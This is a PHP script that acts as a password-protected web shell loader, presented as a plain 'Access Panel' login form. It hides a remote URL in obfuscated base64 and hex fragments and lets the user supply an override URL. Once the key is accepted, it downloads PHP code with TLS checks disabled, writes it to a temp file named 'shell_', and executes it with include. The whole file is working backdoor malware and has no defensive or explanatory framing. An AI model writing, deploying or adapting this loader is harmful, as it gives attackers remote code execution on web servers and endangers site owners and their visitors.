<?php
session_start();

$encodedParts = [
    'Njg3NDc0NzAzYTNmMmY=',
    'NjI2MTg2YzZrNmI2NzZyNmUu',
    'eXoyZnM2aGVs',
    'Mi40MDMudHh0',
    'ZnJpZW5kcw=='
];

function decodeCustom($parts) {
    $decoded = '';
    foreach (array_slice($parts, 0, -1) as $part) {
        $hex = base64_decode($part);
        $decoded .= hex2bin($hex);
    }
    return $decoded;
}

function checkAccess() {
    return isset($_SESSION['verified']) && $_SESSION['verified'] === true;
}

function verifyUser($input) {
    if (hash('sha256', $input) === hash('sha256', base64_decode(end($GLOBALS['encodedParts'])))) {
        $_SESSION['verified'] = true;
        $_SESSION['access_url'] = isset($_POST['target_url']) && filter_var($_POST['target_url'], FILTER_VALIDATE_URL)
            ? $_POST['target_url']
            : decodeCustom($GLOBALS['encodedParts']);
        return true;
    }
    return false;
}

function fetchRemoteData($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($ch);
        if (curl_errno($ch)) {
            error_log('Curl error: ' . curl_error($ch));
        }
        curl_close($ch);
        return $data;
    } elseif (function_exists('file_get_contents')) {
        $data = @file_get_contents($url);
        if ($data === false) {
            error_log("file_get_contents failed for URL: $url");
        }
        return $data;
    } else {
        return false;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auth_input'])) {
    $authInput = $_POST['auth_input'];
    if (verifyUser($authInput)) {
        $_SESSION['auth_token'] = bin2hex(random_bytes(16));
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "<p style='color:red;text-align:center;'>Invalid Access...</p>";
    }
}

if (checkAccess()) {
    $targetUrl = $_SESSION['access_url'];
    error_log("Accessing URL: $targetUrl");
    $response = fetchRemoteData($targetUrl);

    if ($response === false) {
        echo "<p style='color:red;text-align:center;'>Failed to retrieve data.</p>";
    } elseif (trim($response) === '') {
        echo "<p style='color:red;text-align:center;'>Empty response received.</p>";
    } elseif (strpos(trim($response), '<?php') === 0) {
        // Simpan dan eksekusi dengan include
        $tempFile = sys_get_temp_dir() . '/shell_' . session_id() . '.php';
        file_put_contents($tempFile, $response);
        include $tempFile;
        unlink($tempFile);
    } else {
        echo "<p style='color:red;text-align:center;'>Invalid code format.</p>";
    }
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Access Panel</title></head>
    <body style="text-align:center;font-family:sans-serif;margin-top:100px;">
        <form method="POST" style="display:inline-block;">
            <label for="auth_input">Access Key</label><br>
            <input id="auth_input" name="auth_input" type="password" placeholder="🔑 Key"><br><br>
            <label for="target_url">Override URL (optional)</label><br>
            <input id="target_url" name="target_url" type="text"><br><br>
            <input type="submit" value="Submit Access">
        </form>
    </body>
    </html>
    <?php
}